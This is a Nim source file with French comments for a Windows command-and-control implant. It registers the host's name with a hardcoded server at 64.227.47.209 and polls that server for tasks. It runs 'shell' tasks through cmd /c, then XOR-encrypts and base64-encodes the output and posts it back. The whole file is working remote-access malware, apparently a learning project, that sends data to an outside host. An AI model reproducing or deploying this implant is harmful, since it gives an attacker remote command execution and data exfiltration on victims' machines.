import std/envvars
import std/nativesockets
import winim/lean
import httpclient
import os
import strutils
import osproc
import base64
import std/uri

const base_url = "http://64.227.47.209"
const SLEEP_TIME = 5000 # 5 secondes en millisecondes

# Je ne savais pas lequel prendre alors je l'ai ai tous mis
# avec std/envvars
proc getHostnameEnvVars(): string =
  result = getEnv("COMPUTERNAME", getEnv("HOSTNAME", "unknown"))

# avec std/nativesockets
proc getHostnameNativeSockets(): string =
  try:
    result = getHostname()
  except:
    result = "unknown"

# avec winim/lean
proc getHostnameWin(): string =
  var computerName: array[MAX_COMPUTERNAME_LENGTH + 1, CHAR]
  var size = computerName.len.DWORD
  if GetComputerNameA(computerName[0].addr, size.addr) != 0:
    return $computerName
  else:
    return "unknown"

proc getHostname(): string =
  # Essayons plusieurs méthodes
  result = getHostnameEnvVars()
  if result == "unknown":
    result = getHostnameNativeSockets()
  if result == "unknown":
    result = getHostnameWin()

proc getTask(name: string): string =
 let client = newHttpClient()
 let url = base_url & "/tasks/" & name
 try:
   let response = client.get(url)
   result = response.body
 except:
   echo "Erreur lors de l'envoi de la requête : ", getCurrentExceptionMsg()
   result = ""
 finally:
   client.close()

proc execTask(command: string): string =
  if command.startsWith("shell "):
    let shellCmd = command[6..^1] # Recupération de la commande sans "shell "
    echo "Execution de la commande : " & shellCmd

    try:
      var (cmdOutput, exitCode) = execCmdEx("cmd /c " & shellCmd, options = {poStdErrToStdOut}) # Execution de la tâche 
      cmdOutput = cmdOutput.strip()  # Enlève les espaces et newlines au début/fin
      cmdOutput = cmdOutput.replace("\r\n", "\n")  # Uniformise les fins de ligne
      result = cmdOutput
    except OSError as e:
      result = e.msg
  else:
    result = ""

proc xorString(input: string, key: string): string =
 result = ""
 for i in 0..<input.len:
   let keyChar = key[i mod key.len]
   result.add(chr(input[i].ord xor keyChar.ord))

proc sendOutput(output: string, name: string): string =
  let client = newHttpClient()

  let url = base_url & "/results/" & name

  let encrypted = xorString(output, "NOAH") # Clé XOR de 4 caractères, meme que sur le C2
  let encoded = encode(encrypted.toOpenArrayByte(0, encrypted.high)) # Encodage en base64
  let encoded_url = encodeUrl(encoded, false) # Encodage en url

  let payload = "result=" & encoded_url
  
  client.headers = newHttpHeaders({
    "Content-Type": "application/x-www-form-urlencoded"
  })
  try:
    let response = client.post(url, payload)
    result = response.body
  except:
    result = ""
  finally:
    client.close()


proc register(): string =
  let client = newHttpClient()

  let url = base_url & "/reg"

  let hostname = getHostname()
  
  let payload = "name=" & hostname

  client.headers = newHttpHeaders({
    "Content-Type": "application/x-www-form-urlencoded"
  })

  try:
    let response = client.post(url, payload)
    echo "id attribué : ", response.body
    echo "Hostname used: ", hostname & "\n"
    result = response.body
  except:
    echo "Erreur lors de l'envoi de la requête : ", getCurrentExceptionMsg()
    result = ""
  finally:
    client.close()

proc main() =
 echo "Enregistrement Nouveau client \n"
 let registered_name = register()
 if registered_name.len > 0:
   while true:
     echo "Recupération des tâches...\n"
     let task = getTask(registered_name)
     if task != "":
      let retour_task = execTask(task)
      echo "Retour de la commande : " & retour_task

      if retour_task != "":
        let retour_send_output = sendOutput(retour_task, registered_name)
        if retour_send_output == "":
          echo "Tout s'est bien passé"
        else:
          echo "Il y a eu un problème"
     sleep(SLEEP_TIME)

when isMainModule:
  main()